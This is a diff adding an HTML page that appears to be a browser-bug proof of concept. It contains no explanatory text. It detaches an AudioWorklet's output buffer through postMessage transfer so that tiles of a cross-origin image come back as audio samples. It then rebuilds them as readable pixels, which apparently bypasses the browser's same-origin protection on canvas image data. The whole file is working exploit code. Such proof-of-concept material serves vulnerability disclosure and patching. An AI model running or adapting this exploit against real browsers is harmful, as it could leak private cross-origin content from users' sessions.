@@ -1,0 +1,93 @@
+<body>
+<script>
+function runInWorket() {
+  class MyWorkletProcessor extends AudioWorkletProcessor {
+    constructor() {
+      super();
+
+      this.port.onmessage = event => {
+        this.bitmap = event.data;
+      }
+    }
+
+    detachBuffer(buffer) {
+      try {
+        this.port.postMessage([buffer], [buffer, this.port]);
+      } catch { }
+    }
+
+    process(inputs, outputs, params) {
+      this.detachBuffer(outputs[0][0].buffer);
+      this.port.postMessage(this.bitmap);
+      return false;
+    }
+  }
+
+  registerProcessor("my-worklet-processor", MyWorkletProcessor);
+}
+
+let blob = new Blob([`(${runInWorket}())`], {type: "text/javascript"});
+let url = URL.createObjectURL(blob);
+
+class MyWorkletNode extends AudioWorkletNode {
+  constructor(context) {
+    super(context, "my-worklet-processor", {channelCount: 1});
+  }
+}
+
+function go() {
+  original_image.src = target_url.value;
+  original_image.onload = async () => {
+    canvas = document.createElement("canvas");
+    canvas.width = original_image.width;
+    canvas.height = original_image.height;
+    canvas_context = canvas.getContext("2d");
+    canvas_context.drawImage(original_image, 0, 0);
+
+    output_canvas = document.createElement("canvas");
+    output_canvas.width = original_image.width;
+    output_canvas.height = original_image.height;
+    output_canvas_context = output_canvas.getContext("2d");
+    document.body.appendChild(output_canvas);
+
+    for (let x = 0; x < original_image.width - original_image.width % 16; x += 16) {
+      for (let y = 0; y < original_image.height - original_image.height % 8; y += 8) {
+        image_bitmap = await createImageBitmap(canvas, x, y, 16, 8);
+
+        audio_context = new OfflineAudioContext(1, 128, 8000);
+        await audio_context.audioWorklet.addModule(url);
+        oscillator = new OscillatorNode(audio_context);
+        node = new MyWorkletNode(audio_context);
+        node.port.postMessage(image_bitmap);
+
+        analyser = new AnalyserNode(audio_context);
+        oscillator.connect(node).connect(audio_context.destination);
+        audio_buffer = await audio_context.startRendering();
+        data = new Uint8Array(audio_buffer.getChannelData(0).buffer);
+
+        // fix colors
+        for (let i = 0; i < data.length; i += 4) {
+          let tmp = data[i + 0];
+          data[i + 0] = data[i + 2];
+          data[i + 2] = tmp;          
+        }
+
+        image_data = new ImageData(image_bitmap.width, image_bitmap.height);
+        image_data.data.set(data);
+
+        output_canvas_context.putImageData(image_data, x, y);
+      }
+    }
+  }
+}
+</script>
+<span>image url</span>
+<input id="target_url" size="100"
+  value="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"/>
+<button onclick="go()">Go</button>
+
+<h2>original image</h1>
+<img id="original_image"/>
+
+<h2>reconstructed image</h1>
+</body>
